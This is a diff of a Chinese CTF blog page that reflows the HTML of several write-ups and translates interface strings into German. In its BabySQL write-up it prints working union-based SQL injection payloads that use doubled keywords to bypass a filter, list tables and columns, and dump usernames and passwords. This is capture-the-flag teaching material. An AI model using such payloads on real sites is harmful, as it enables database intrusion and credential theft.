-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure>
+<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er"><br>使用的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure></p>
 
         </div>
         
@@ -650,7 +555,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds read (About 86 words)
+                    a few seconds lesen (Über 86 Worte)
                 </span>
                 
                 
@@ -663,12 +568,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>查看流量包：发现数据包有很多http协议，直接导出http对象。</strong></p>
-<img src="/2-8-SUCTF2018-followme/1.png" class title="Da4er">
-<img src="/2-8-SUCTF2018-followme/2.png" class title="Da4er">
-<p><strong>仔细分析后发现：这个是爆破admin密码的流量，找到爆破密码的地方，一个一个查看password字段的值，得到flag</strong></p>
-<img src="/2-8-SUCTF2018-followme/3.png" class title="Da4er">
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看流量包：发现数据包有很多http协议，直接导出http对象。</strong><br><img src="/2-8-SUCTF2018-followme/1.png" class title="Da4er"><br><img src="/2-8-SUCTF2018-followme/2.png" class title="Da4er"><br><strong>仔细分析后发现：这个是爆破admin密码的流量，找到爆破密码的地方，一个一个查看password字段的值，得到flag</strong><br><img src="/2-8-SUCTF2018-followme/3.png" class title="Da4er"></p>
 
         </div>
         
@@ -703,7 +603,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 178 words)
+                    a minute lesen (Über 178 Worte)
                 </span>
                 
                 
@@ -716,16 +616,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>拿到题目是张图片，binwalk分离出一个txt</strong></p>
-<img src="/2-8-SUCTF2018-single-dog/1.png" class title="Da4er">
-<p>打开txt文件发现是aaencode加密</p>
-<img src="/2-8-SUCTF2018-single-dog/2.png" class title="Da4er">
-<p>到这里我遇到的坑出来了，对aaencode解密可以使用控制台解密，但是解密出来的是</p>
-<img src="/2-8-SUCTF2018-single-dog/3.png" class title="Da4er">
-<p>然后又看了这道题，把所有的jpg隐写的方法都试了一遍还是没有flag。<br>最后其实就是aaencode解密，以前遇到的是直接alert()出来flag，但是这个题不一样，需要找到在线网站解密。<br><a href="https://www.qtool.net/decode">aaencode解密网址</a><br>用这个网站解码出来：</p>
-<img src="/2-8-SUCTF2018-single-dog/4.png" class title="Da4er">
-<p>得到flag。</p>
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>拿到题目是张图片，binwalk分离出一个txt</strong><br><img src="/2-8-SUCTF2018-single-dog/1.png" class title="Da4er"><br>打开txt文件发现是aaencode加密<br><img src="/2-8-SUCTF2018-single-dog/2.png" class title="Da4er"><br>到这里我遇到的坑出来了，对aaencode解密可以使用控制台解密，但是解密出来的是<br><img src="/2-8-SUCTF2018-single-dog/3.png" class title="Da4er"><br>然后又看了这道题，把所有的jpg隐写的方法都试了一遍还是没有flag。<br>最后其实就是aaencode解密，以前遇到的是直接alert()出来flag，但是这个题不一样，需要找到在线网站解密。<br><a href="https://www.qtool.net/decode">aaencode解密网址</a><br>用这个网站解码出来：<br><img src="/2-8-SUCTF2018-single-dog/4.png" class title="Da4er"><br>得到flag。</p>
 
         </div>
         
@@ -748,10 +639,10 @@
 <div class="card card-transparent">
     <nav class="pagination is-centered" role="navigation" aria-label="pagination">
         <div class="pagination-previous">
-            <a class="is-flex-grow has-text-black-ter" href="/categories/CTF/">Previous</a>
+            <a class="is-flex-grow has-text-black-ter" href="/categories/CTF/">Zurück</a>
         </div>
         <div class="pagination-next">
-            <a class="is-flex-grow has-text-black-ter" href="/categories/CTF/page/3/">Next</a>
+            <a class="is-flex-grow has-text-black-ter" href="/categories/CTF/page/3/">Weiter</a>
         </div>
         <ul class="pagination-list is-hidden-mobile">
             
@@ -828,7 +719,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -958,7 +849,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -983,7 +874,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -1012,7 +903,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -1117,7 +1008,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1263,7 +1154,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -1288,7 +1179,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -1317,7 +1208,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -1422,7 +1313,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1649,7 +1540,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1673,7 +1564,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1686,10 +1577,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
